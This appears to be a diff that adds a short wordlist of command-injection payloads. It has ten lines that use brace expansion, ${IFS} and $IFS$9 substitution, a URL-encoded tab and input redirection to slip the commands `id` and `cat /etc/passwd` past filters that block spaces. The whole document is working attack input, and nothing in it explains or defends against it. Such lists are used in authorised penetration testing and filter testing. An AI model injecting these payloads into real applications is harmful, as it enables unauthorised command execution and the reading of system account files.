@@ -1,0 +1,10 @@
+{id}
+${IFS}id
+$IFS$9id
+id${IFS}
+$IFS<id
+%09id
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat</etc/passwd
